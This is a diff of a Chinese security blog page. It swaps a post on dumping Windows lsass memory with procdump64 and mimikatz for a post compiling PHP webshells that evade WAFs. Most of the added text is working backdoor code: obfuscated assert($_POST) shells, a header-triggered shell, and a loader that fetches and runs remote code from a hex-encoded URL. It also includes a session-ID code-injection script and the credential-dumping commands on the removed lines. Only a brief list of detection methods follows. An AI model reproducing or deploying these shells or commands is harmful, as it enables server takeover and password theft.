@@ -86,17 +86,17 @@
 
 
 
-<meta name="description" content="两步完成利用procdump64+mimikatz获取win用户密码  使用procdump64+mimikatz可实现从内存中获取明文密码1.导出lsass.exe  procdump64.exe -accepteula -ma lsass.exe lsass.dmp(注:必须使用管理员权限)  2.执行mimikatzmimikatz.exe  &amp;quot;sekurlsa::minidump">
+<meta name="description" content="常见绕过WAF的PHP:字符串变形 大小写、编码、截取、替换、特殊字符拼接、null、回车、换行、特殊字符串干扰  &amp;lt;?php $a = base64_decode(&amp;quot;YXNzYXNz+00000____&amp;quot;); $a = substr_replace($a,&amp;quot;ert&amp;quot;,3); $a($_POST[&amp;apos;x&amp;apos;]); ?&amp;gt;  ucwo">
 <meta property="og:type" content="article">
-<meta property="og:title" content="两步完成利用procdump64+mimikatz获取win用户密码">
-<meta property="og:url" content="http://MaiKeFee.com/archives/f86fa73d.html">
+<meta property="og:title" content="PHP常见绕过WAF方法汇总">
+<meta property="og:url" content="http://MaiKeFee.com/archives/3f60c38c.html">
 <meta property="og:site_name" content="MaiKeFee|">
-<meta property="og:description" content="两步完成利用procdump64+mimikatz获取win用户密码  使用procdump64+mimikatz可实现从内存中获取明文密码1.导出lsass.exe  procdump64.exe -accepteula -ma lsass.exe lsass.dmp(注:必须使用管理员权限)  2.执行mimikatzmimikatz.exe  &amp;quot;sekurlsa::minidump">
+<meta property="og:description" content="常见绕过WAF的PHP:字符串变形 大小写、编码、截取、替换、特殊字符拼接、null、回车、换行、特殊字符串干扰  &amp;lt;?php $a = base64_decode(&amp;quot;YXNzYXNz+00000____&amp;quot;); $a = substr_replace($a,&amp;quot;ert&amp;quot;,3); $a($_POST[&amp;apos;x&amp;apos;]); ?&amp;gt;  ucwo">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2019-09-06T02:57:02.377Z">
+<meta property="og:updated_time" content="2019-09-08T12:11:48.462Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="两步完成利用procdump64+mimikatz获取win用户密码">
-<meta name="twitter:description" content="两步完成利用procdump64+mimikatz获取win用户密码  使用procdump64+mimikatz可实现从内存中获取明文密码1.导出lsass.exe  procdump64.exe -accepteula -ma lsass.exe lsass.dmp(注:必须使用管理员权限)  2.执行mimikatzmimikatz.exe  &amp;quot;sekurlsa::minidump">
+<meta name="twitter:title" content="PHP常见绕过WAF方法汇总">
+<meta name="twitter:description" content="常见绕过WAF的PHP:字符串变形 大小写、编码、截取、替换、特殊字符拼接、null、回车、换行、特殊字符串干扰  &amp;lt;?php $a = base64_decode(&amp;quot;YXNzYXNz+00000____&amp;quot;); $a = substr_replace($a,&amp;quot;ert&amp;quot;,3); $a($_POST[&amp;apos;x&amp;apos;]); ?&amp;gt;  ucwo">
 
 
 
@@ -126,13 +126,13 @@
 
 
 
-  <link rel="canonical" href="http://MaiKeFee.com/archives/f86fa73d.html">
+  <link rel="canonical" href="http://MaiKeFee.com/archives/3f60c38c.html">
 
 
 
 
 
-  <title>两步完成利用procdump64+mimikatz获取win用户密码 | MaiKeFee|</title>
+  <title>PHP常见绕过WAF方法汇总 | MaiKeFee|</title>
   
 
 
@@ -312,7 +312,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://MaiKeFee.com/archives/f86fa73d.html">
+    <link itemprop="mainEntityOfPage" href="http://MaiKeFee.com/archives/3f60c38c.html">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="MaiKeFee">
@@ -329,7 +329,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">两步完成利用procdump64+mimikatz获取win用户密码</h1>
+          <h1 class="post-title" itemprop="name headline">PHP常见绕过WAF方法汇总</h1>
         
 
         <div class="post-meta">
@@ -341,8 +341,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-09-03T15:27:06+08:00">
-                2019-09-03
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-09-08T20:06:26+08:00">
+                2019-09-08
               </time>
             
 
@@ -357,67 +357,12 @@
               
                 <span class="post-meta-item-text">更新于&#58;</span>
               
-              <time title="更新于" itemprop="dateModified" datetime="2019-09-06T10:57:02+08:00">
-                2019-09-06
+              <time title="更新于" itemprop="dateModified" datetime="2019-09-08T20:11:48+08:00">
+                2019-09-08
               </time>
             
           </span>
 
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/渗透测试/" itemprop="url" rel="index">
-                    <span itemprop="name">渗透测试</span>
-                  </a>
-                </span>
-
-                
-                
-                  ， 
-                
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/渗透测试/后渗透/" itemprop="url" rel="index">
-                    <span itemprop="name">后渗透</span>
-                  </a>
-                </span>
-
-                
-                
-                  ， 
-                
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/渗透测试/后渗透/内网渗透/" itemprop="url" rel="index">
-                    <span itemprop="name">内网渗透</span>
-                  </a>
-                </span>
-
-                
-                
-                  ， 
-                
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/渗透测试/后渗透/内网渗透/提权-系统级/" itemprop="url" rel="index">
-                    <span itemprop="name">提权(系统级)</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
           
 
           
@@ -427,8 +372,8 @@
                 <span class="post-meta-item-icon">
                   <i class="fa fa-comment-o"></i>
                 </span>
-                <a href="/archives/f86fa73d.html#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count valine-comment-count" data-xid="/archives/f86fa73d.html" itemprop="commentCount"></span>
+                <a href="/archives/3f60c38c.html#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count valine-comment-count" data-xid="/archives/3f60c38c.html" itemprop="commentCount"></span>
                 </a>
               </span>
             
@@ -436,7 +381,7 @@
 
           
           
-             <span id="/archives/f86fa73d.html" class="leancloud_visitors" data-flag-title="两步完成利用procdump64+mimikatz获取win用户密码">
+             <span id="/archives/3f60c38c.html" class="leancloud_visitors" data-flag-title="PHP常见绕过WAF方法汇总">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-eye"></i>
@@ -462,7 +407,7 @@
                   <span class="post-meta-item-text">字数统计&#58;</span>
                 
                 <span title="字数统计">
-                  88
+                  545
                 </span>
               
 
@@ -478,7 +423,7 @@
                   <span class="post-meta-item-text">阅读时长 &asymp;</span>
                 
                 <span title="阅读时长">
-                  1
+                  2
                 </span>
               
             </div>
@@ -499,12 +444,100 @@
       
 
       
-        <h1 id="两步完成利用procdump64-mimikatz获取win用户密码"><a href="#两步完成利用procdump64-mimikatz获取win用户密码" class="headerlink" title="两步完成利用procdump64+mimikatz获取win用户密码"></a>两步完成利用procdump64+mimikatz获取win用户密码</h1><hr>
-<ul>
-<li>使用procdump64+mimikatz可实现从内存中获取明文密码<h3 id="1-导出lsass-exe"><a href="#1-导出lsass-exe" class="headerlink" title="1.导出lsass.exe"></a>1.导出lsass.exe</h3>  procdump64.exe -accepteula -ma lsass.exe lsass.dmp<br>(注:必须使用管理员权限)</li>
-</ul>
-<h3 id="2-执行mimikatz"><a href="#2-执行mimikatz" class="headerlink" title="2.执行mimikatz"></a>2.执行mimikatz</h3><pre><code>mimikatz.exe  &quot;sekurlsa::minidump lsass.dmp&quot;  &quot;sekurlsa::logonPasswords full&quot;  exit</code></pre><p>(注:必须使用管理员权限)</p>
-<h3 id="成功获取明文密码"><a href="#成功获取明文密码" class="headerlink" title="成功获取明文密码"></a>成功获取明文密码</h3>
+        <h1 id="常见绕过WAF的PHP"><a href="#常见绕过WAF的PHP" class="headerlink" title="常见绕过WAF的PHP:"></a>常见绕过WAF的PHP:</h1><h2 id="字符串变形"><a href="#字符串变形" class="headerlink" title="字符串变形"></a>字符串变形</h2><blockquote>
+<p>大小写、编码、截取、替换、特殊字符拼接、null、回车、换行、特殊字符串干扰</p>
+</blockquote>
+<pre><code>&lt;?php
+$a = base64_decode(&quot;YXNzYXNz+00000____&quot;);
+$a = substr_replace($a,&quot;ert&quot;,3);
+$a($_POST[&apos;x&apos;]);
+?&gt;
+
+ucwords()
+ucfirst()
+trim()
+substr_replace()
+substr()
+strtr()
+strtoupper()
+strtolower()
+strtok()
+str_rot13()
+chr()
+gzcompress()、gzdeflate()、gzencode()
+gzuncompress()、gzinflate()、gzdecode()
+base64_encode()
+base64_decode()
+pack()
+unpack()</code></pre><h1 id="自写函数"><a href="#自写函数" class="headerlink" title="自写函数"></a>自写函数</h1><blockquote>
+<p>利用assert()</p>
+</blockquote>
+<pre><code>&lt;?php 
+function test($a){
+    $a($_POST[&apos;x&apos;]);
+}
+test(assert);
+?&gt;</code></pre><h1 id="回调函数"><a href="#回调函数" class="headerlink" title="回调函数"></a>回调函数</h1><pre><code>&lt;?php 
+call_user_func(assert,array($_POST[x]));
+?&gt;
+call_user_func_array()
+array_filter() 
+array_walk()  
+array_map()
+registregister_shutdown_function()
+register_tick_function()
+filter_var() 
+filter_var_array() 
+uasort() 
+uksort() 
+array_reduce()
+array_walk() 
+array_walk_recursive()
+forward_static_call_array()</code></pre><h1 id="类"><a href="#类" class="headerlink" title="类"></a>类</h1><h2 id="利用魔术方法、析构函数destruct-，construct"><a href="#利用魔术方法、析构函数destruct-，construct" class="headerlink" title="利用魔术方法、析构函数destruct()，construct()"></a>利用魔术方法、析构函数<strong>destruct()，</strong>construct()</h2><pre><code>&lt;?php 
+class test
+{
+  public $a = &apos;&apos;;
+  function __destruct(){
+    assert(&quot;$this-&gt;a&quot;);
+  }
+}
+$b = new test;
+$b-&gt;a = $_POST[&apos;x&apos;];
+?&gt;</code></pre><h1 id="利用外部文件"><a href="#利用外部文件" class="headerlink" title="利用外部文件"></a>利用外部文件</h1><h2 id="利用curl-fsockopen等发起网络请求再结合file-get-contents"><a href="#利用curl-fsockopen等发起网络请求再结合file-get-contents" class="headerlink" title="利用curl, fsockopen等发起网络请求再结合file_get_contents"></a>利用curl, fsockopen等发起网络请求再结合file_get_contents</h2><pre><code>&lt;?php
+error_reporting(0);
+session_start();
+header(&quot;Content-type:text/html;charset=utf-8&quot;);if(empty($_SESSION[&apos;api&apos;]))
+$_SESSION[&apos;api&apos;]=substr(file_get_contents(sprintf(&apos;%s?%s&apos;,pack(&quot;H*&quot;,
+&apos;687474703a2f2f7777772e77326e31636b2e636f6d2f7368656c6c2f312e6a7067&apos;),uniqid())),3649);
+@preg_replace(&quot;~(.*)~ies&quot;,gzuncompress($_SESSION[&apos;api&apos;]),null);
+?&gt;</code></pre><h1 id="无字符特征马"><a href="#无字符特征马" class="headerlink" title="无字符特征马"></a>无字符特征马</h1><h2 id="编码、异或、自增"><a href="#编码、异或、自增" class="headerlink" title="编码、异或、自增"></a>编码、异或、自增</h2><pre><code>&lt;?php
+$_=(&apos;%01&apos;^&apos;`&apos;).(&apos;%13&apos;^&apos;`&apos;).(&apos;%13&apos;^&apos;`&apos;).(&apos;%05&apos;^&apos;`&apos;).(&apos;%12&apos;^&apos;`&apos;).(&apos;%14&apos;^&apos;`&apos;); // $_=&apos;assert&apos;;
+$__=&apos;_&apos;.(&apos;%0D&apos;^&apos;]&apos;).(&apos;%2F&apos;^&apos;`&apos;).(&apos;%0E&apos;^&apos;]&apos;).(&apos;%09&apos;^&apos;]&apos;); // $__=&apos;_POST&apos;;
+$___=$$__;
+$_($___[_]); // assert($_POST[_]);
+?&gt;</code></pre><h1 id="特殊请求头"><a href="#特殊请求头" class="headerlink" title="特殊请求头"></a>特殊请求头</h1><h2 id="利用getallheaders"><a href="#利用getallheaders" class="headerlink" title="利用getallheaders()"></a>利用getallheaders()</h2><pre><code>&lt;?php
+$cai=getallheaders()[&apos;cai&apos;];
+$dao=getallheaders()[&apos;dao&apos;];
+if($cai!=&quot;&quot; and $dao!=&quot;&quot;){
+  $cai=gzuncompress(base64_decode($cai));$cai(gzuncompress(base64_decode($dao)));
+}
+header(&apos;HTTP/1.1 404 Not Found&apos;);
+?&gt;</code></pre><h1 id="全局变量"><a href="#全局变量" class="headerlink" title="全局变量"></a>全局变量</h1><h2 id="利用getenv-，arrag-flip-，get-defined-vars-，session-id"><a href="#利用getenv-，arrag-flip-，get-defined-vars-，session-id" class="headerlink" title="利用getenv()，arrag_flip()，get_defined_vars()，session_id()"></a>利用getenv()，arrag_flip()，get_defined_vars()，session_id()</h2><pre><code>import requests
+url = &apos;http://localhost/?code=eval(hex2bin(session_id(session_start())));&apos;
+payload = &quot;phpinfo();&quot;.encode(&apos;hex&apos;)
+cookies = {
+  &apos;PHPSESSID&apos;:payload
+}
+r = requests.get(url=url,cookies=cookies)
+print r.content</code></pre><h1 id="PHP混淆加解密"><a href="#PHP混淆加解密" class="headerlink" title="PHP混淆加解密"></a>PHP混淆加解密</h1><h2 id="以phpjiami为例"><a href="#以phpjiami为例" class="headerlink" title="以phpjiami为例"></a>以phpjiami为例</h2><pre><code>就是将函数名、变量名全部变成&quot;乱码&quot;，且改动任意一个地方，都将导致文件不能运行。具体可访问：https://www.phpjiami.com/</code></pre><h1 id="webshell检测方法-大概"><a href="#webshell检测方法-大概" class="headerlink" title="webshell检测方法(大概)"></a>webshell检测方法(大概)</h1><pre><code>机器学习检测webshell：比如混淆度、最长单词、重合指数、特征、压缩比等
+
+动态检测（沙箱）
+
+基于流量模式检测webshell：agent
+
+逆向算法+静态匹配检测webshell：比如D盾webshell查杀
+
+根据文件入度出度来检测</code></pre>
       
     </div>
     
@@ -530,12 +563,12 @@
   <script src="http://jslibs.wuxubj.cn/sweetalert_mini/sweetalert.min.js"></script>
   <link rel="stylesheet" type="text/css" href="http://jslibs.wuxubj.cn/sweetalert_mini/sweetalert.mini.css">
 
-  <p><span>本文标题:</span>两步完成利用procdump64+mimikatz获取win用户密码</p>
+  <p><span>本文标题:</span>PHP常见绕过WAF方法汇总</p>
   <p><span>文章作者:</span>MaiKeFee</p>
-  <p><span>发布时间:</span>2019年09月03日</p>
-  <p><span>最后更新:</span>2019年09月06日</p>
-  <p><span>原始链接:</span><a href="/archives/f86fa73d.html" title="两步完成利用procdump64+mimikatz获取win用户密码">http://MaiKeFee.com/archives/f86fa73d.html</a>
-    <span class="copy-path" title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="http://MaiKeFee.com/archives/f86fa73d.html" aria-label="复制成功！"></i></span>
+  <p><span>发布时间:</span>2019年09月08日</p>
+  <p><span>最后更新:</span>2019年09月08日</p>
+  <p><span>原始链接:</span><a href="/archives/3f60c38c.html" title="PHP常见绕过WAF方法汇总">http://MaiKeFee.com/archives/3f60c38c.html</a>
+    <span class="copy-path" title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="http://MaiKeFee.com/archives/3f60c38c.html" aria-label="复制成功！"></i></span>
   </p>
   
 </div>
@@ -573,8 +606,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/archives/694daf10.html" rel="next" title="Phpmyadmin_getshell">
-                <i class="fa fa-chevron-left"></i> Phpmyadmin_getshell
+              <a href="/archives/67b2bdd.html" rel="next" title="无关键字进行SQL注入">
+                <i class="fa fa-chevron-left"></i> 无关键字进行SQL注入
               </a>
             
           </div>
@@ -582,10 +615,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/archives/f71d256c.html" rel="prev" title="渗透工具库总纲">
-                渗透工具库总纲 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
           
@@ -785,7 +814,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#两步完成利用procdump64-mimikatz获取win用户密码"><span class="nav-number">1.</span> <span class="nav-text">两步完成利用procdump64+mimikatz获取win用户密码</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-导出lsass-exe"><span class="nav-number">1.0.1.</span> <span class="nav-text">1.导出lsass.exe</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-执行mimikatz"><span class="nav-number">1.0.2.</span> <span class="nav-text">2.执行mimikatz</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#成功获取明文密码"><span class="nav-number">1.0.3.</span> <span class="nav-text">成功获取明文密码</span></a></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#常见绕过WAF的PHP"><span class="nav-number">1.</span> <span class="nav-text">常见绕过WAF的PHP:</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#字符串变形"><span class="nav-number">1.1.</span> <span class="nav-text">字符串变形</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#自写函数"><span class="nav-number">2.</span> <span class="nav-text">自写函数</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#回调函数"><span class="nav-number">3.</span> <span class="nav-text">回调函数</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#类"><span class="nav-number">4.</span> <span class="nav-text">类</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#利用魔术方法、析构函数destruct-，construct"><span class="nav-number">4.1.</span> <span class="nav-text">利用魔术方法、析构函数destruct()，construct()</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#利用外部文件"><span class="nav-number">5.</span> <span class="nav-text">利用外部文件</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#利用curl-fsockopen等发起网络请求再结合file-get-contents"><span class="nav-number">5.1.</span> <span class="nav-text">利用curl, fsockopen等发起网络请求再结合file_get_contents</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#无字符特征马"><span class="nav-number">6.</span> <span class="nav-text">无字符特征马</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#编码、异或、自增"><span class="nav-number">6.1.</span> <span class="nav-text">编码、异或、自增</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#特殊请求头"><span class="nav-number">7.</span> <span class="nav-text">特殊请求头</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#利用getallheaders"><span class="nav-number">7.1.</span> <span class="nav-text">利用getallheaders()</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#全局变量"><span class="nav-number">8.</span> <span class="nav-text">全局变量</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#利用getenv-，arrag-flip-，get-defined-vars-，session-id"><span class="nav-number">8.1.</span> <span class="nav-text">利用getenv()，arrag_flip()，get_defined_vars()，session_id()</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#PHP混淆加解密"><span class="nav-number">9.</span> <span class="nav-text">PHP混淆加解密</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#以phpjiami为例"><span class="nav-number">9.1.</span> <span class="nav-text">以phpjiami为例</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#webshell检测方法-大概"><span class="nav-number">10.</span> <span class="nav-text">webshell检测方法(大概)</span></a></li></ol></div>
             
 
           </div>
@@ -1511,13 +1540,13 @@
       var articles = db.collection('articles')
 
       //https://hexo.io/zh-tw/docs/variables.html
-      var isPost = '两步完成利用procdump64+mimikatz获取win用户密码'.length > 0
+      var isPost = 'PHP常见绕过WAF方法汇总'.length > 0
       var isArchive = '' === 'true'
       var isCategory = ''.length > 0
       var isTag = ''.length > 0
 
       if (isPost) { //is article page
-        var title = '两步完成利用procdump64+mimikatz获取win用户密码'
+        var title = 'PHP常见绕过WAF方法汇总'
         var doc = articles.doc(title)
 
         getCount(doc, true).then(appendCountTo($('.post-meta')))
